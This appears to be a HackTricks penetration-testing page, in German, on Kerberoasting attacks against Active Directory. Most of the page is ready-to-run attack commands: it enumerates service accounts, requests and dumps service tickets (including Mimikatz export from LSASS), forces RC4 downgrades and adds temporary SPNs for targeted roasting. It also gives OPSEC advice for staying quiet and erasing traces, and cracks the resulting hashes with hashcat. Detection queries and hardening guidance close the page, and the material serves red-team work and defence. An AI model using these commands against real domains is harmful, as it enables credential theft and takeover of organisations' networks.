# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting konzentriert sich auf das Beschaffen von TGS-Tickets, speziell auf jene, die zu Diensten gehören, die unter Benutzerkonten in Active Directory (AD) laufen (nicht unter Computerkonten). Diese Tickets werden mit Schlüsseln verschlüsselt, die aus Benutzerpasswörtern abgeleitet sind, was Offline-Credential-Cracking ermöglicht. Die Nutzung eines Benutzerkontos als Dienst erkennt man an einer nicht-leeren ServicePrincipalName (SPN)-Eigenschaft.

Jeder authentifizierte Domänenbenutzer kann TGS-Tickets anfordern, es sind also keine besonderen Rechte erforderlich.

### Key Points

- Zielt auf TGS-Tickets für Dienste, die unter Benutzerkonten laufen (d. h. Konten mit gesetztem SPN; nicht Computerkonten).
- Tickets sind mit einem Schlüssel verschlüsselt, der aus dem Passwort des Service-Kontos abgeleitet wird, und können offline geknackt werden.
- Keine erhöhten Rechte erforderlich; jedes authentifizierte Konto kann TGS-Tickets anfordern.

> [!WARNING]
> Die meisten öffentlichen Tools bevorzugen das Anfordern von RC4-HMAC (etype 23) Service-Tickets, da diese schneller zu knacken sind als AES. RC4-TGS-Hashes beginnen mit `$krb5tgs$23$*`, AES128 mit `$krb5tgs$17$*` und AES256 mit `$krb5tgs$18$*`. Viele Umgebungen gehen jedoch zu AES-only über. Gehe nicht davon aus, dass nur RC4 relevant ist.
> Vermeide außerdem „spray-and-pray“ roasting. Rubeus’ default kerberoast kann alle SPNs abfragen und Tickets anfordern und ist damit laut. Zuerst interessante Principals enumerieren und gezielt anfragen.

### Service account secrets & Kerberos crypto cost

Viele Dienste laufen noch unter Benutzerkonten mit manuell verwalteten Passwörtern. Der KDC verschlüsselt Service-Tickets mit Schlüsseln, die aus diesen Passwörtern abgeleitet sind, und gibt den Ciphertext an jeden authentifizierten Principal weiter, sodass Kerberoasting unbegrenzte Offline-Versuche ohne Sperren oder DC-Telemetrie ermöglicht. Der Verschlüsselungsmodus bestimmt das Cracking-Budget:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 mit 4.096 Iterationen und einem pro-Principal Salt, erzeugt aus der Domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blockiert rainbow tables, erlaubt aber weiterhin schnelles Knacken kurzer Passwörter. |
| RC4 + NT hash | Einfache MD4 des Passworts (unsalted NT hash); Kerberos mischt pro Ticket nur einen 8-Byte-Confounder ein | etype 23 (`$krb5tgs$23$`) | ~4.18 **Milliarden** guesses/s | ~1000× schneller als AES; Angreifer erzwingen RC4, wann immer `msDS-SupportedEncryptionTypes` es erlaubt. |

*Benchmarks von Chick3nman, wie in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) zitiert.

Der RC4-Confounder randomisiert nur den Keystream; er fügt pro Versuch keine zusätzliche Arbeit hinzu. Sofern Service-Konten nicht auf zufällige Secrets setzen (gMSA/dMSA, Maschinenkonten oder vault-verwalte Strings), hängt die Kompromittierungsgeschwindigkeit ausschließlich vom GPU-Budget ab. Das Erzwingen von AES-only etypes entfernt das Milliarden-Versuche-pro-Sekunde-Downgrade, aber schwache menschliche Passwörter fallen trotzdem PBKDF2 zum Opfer.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Mehrzweck-Tools einschließlich kerberoast checks:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Auflisten kerberoastable Benutzer
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technik 1: TGS anfordern und dump aus dem Speicher
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technik 2: Automatische tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Eine TGS-Anforderung erzeugt Windows Security Event 4769 (Ein Kerberos-Service-Ticket wurde angefordert).

### OPSEC und AES-only Umgebungen

- Fordere absichtlich RC4 für Konten ohne AES an:
- Rubeus: `/rc4opsec` verwendet tgtdeleg, um Konten ohne AES zu enumerieren und RC4 Service-Tickets anzufordern.
- Rubeus: `/tgtdeleg` mit kerberoast löst ebenfalls RC4-Anfragen aus, wo möglich.
- Roast AES-only Konten anstatt stillschweigend zu scheitern:
- Rubeus: `/aes` enumeriert Konten mit AES aktiviert und fordert AES Service-Tickets an (etype 17/18).
- Wenn du bereits ein TGT hältst (PTT oder aus einer .kirbi), kannst du `/ticket:<blob|path>` mit `/spn:<SPN>` oder `/spns:<file>` verwenden und LDAP überspringen.
- Targeting, Drosselung und weniger Lärm:
- Verwende `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` und `/jitter:<1-100>`.
- Filtere nach wahrscheinlich schwachen Passwörtern mit `/pwdsetbefore:<MM-dd-yyyy>` (ältere Passwörter) oder ziele auf privilegierte OUs mit `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenz / Missbrauch

Wenn Sie ein Konto kontrollieren oder ändern können, können Sie es kerberoastable machen, indem Sie ein SPN hinzufügen:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Ein Konto herabstufen, um RC4 zu aktivieren und cracking zu erleichtern (erfordert write privileges auf dem Zielobjekt):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll an einem Benutzer (temporärer SPN)

Wenn BloodHound anzeigt, dass Sie Kontrolle über ein Benutzerobjekt haben (z. B. GenericWrite/GenericAll), können Sie diesen spezifischen Benutzer zuverlässig „targeted-roast“ durchführen, selbst wenn er derzeit keine SPNs hat:

- Fügen Sie dem kontrollierten Benutzer einen temporären SPN hinzu, um ihn roastable zu machen.
- Beantragen Sie eine TGS-REP, die mit RC4 (etype 23) verschlüsselt ist, für diesen SPN, um das Cracking zu begünstigen.
- Cracken Sie den `$krb5tgs$23$...`-Hash mit hashcat.
- Bereinigen Sie den SPN, um die Spuren zu minimieren.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatisiert das Hinzufügen von SPN -> das Anfordern eines TGS (etype 23) -> das Entfernen von SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Knacke die Ausgabe mit hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: Das Hinzufügen/Entfernen von SPNs verursacht Verzeichnisänderungen (Event ID 5136/4738 beim Zielbenutzer) und die TGS-Anforderung erzeugt Event ID 4769. Erwägen Sie Throttling und umgehende Bereinigung.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

Im September 2022 zeigte Charlie Clark, dass, wenn ein principal keine Pre-Authentifizierung verlangt, es möglich ist, über eine manipulierte KRB_AS_REQ ein Service-Ticket zu erhalten, indem das sname im Request-Body geändert wird, wodurch effektiv ein Service-Ticket statt eines TGT ausgestellt wird. Dies entspricht AS-REP roasting und erfordert keine gültigen Domänenanmeldeinformationen.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Sie müssen eine Liste von Benutzern angeben, da Sie ohne gültige Anmeldeinformationen LDAP mit dieser Technik nicht abfragen können.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwandt

Wenn Sie AS-REP roastable Benutzer anvisieren, siehe auch:

{{#ref}}
asreproast.md
{{#endref}}

### Erkennung

Kerberoasting kann unauffällig sein. Suchen Sie in DCs nach Event ID 4769 und wenden Sie Filter an, um Rauschen zu reduzieren:

- Schließen Sie den Servicenamen `krbtgt` und Servicenamen aus, die mit `$` enden (Computerkonten).
- Schließen Sie Anfragen von Maschinenkonten (`*$$@*`) aus.
- Nur erfolgreiche Anfragen (Fehlercode `0x0`).
- Verfolgen Sie Verschlüsselungstypen: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Alarmieren Sie nicht nur bei `0x17`.

Beispielhafte PowerShell-Triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Weitere Ideen:

- Erfasse eine Baseline des normalen SPN‑Verhaltens pro Host/Benutzer; alarmiere bei großen Sprüngen von vielen verschiedenen SPN‑Anfragen von einem einzelnen principal.
- Markiere ungewöhnliche RC4‑Nutzung in AES‑gehärteten Domänen.

### Gegenmaßnahmen / Härtung

- Verwende gMSA/dMSA oder Maschinenkonten für Dienste. Managed accounts haben 120+ Zeichen zufällige Passwörter und rotieren automatisch, wodurch Offline‑Cracking unpraktisch wird.
- Erzwinge AES bei Servicekonten, indem du `msDS-SupportedEncryptionTypes` auf AES-only (decimal 24 / hex 0x18) setzt und anschließend das Passwort rotierst, sodass AES‑Schlüssel abgeleitet werden.
- Schalte RC4 in deiner Umgebung nach Möglichkeit ab und überwache auf versuchte RC4‑Nutzung. Auf DCs kannst du den Registrierungswert `DefaultDomainSupportedEncTypes` verwenden, um Defaults für Konten ohne gesetzten `msDS-SupportedEncryptionTypes` zu steuern. Gründlich testen.
- Entferne unnötige SPNs aus Benutzerkonten.
- Verwende lange, zufällige Passwörter für Servicekonten (25+ Zeichen), falls managed accounts nicht möglich sind; sperre gebräuchliche Passwörter und prüfe regelmäßig.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
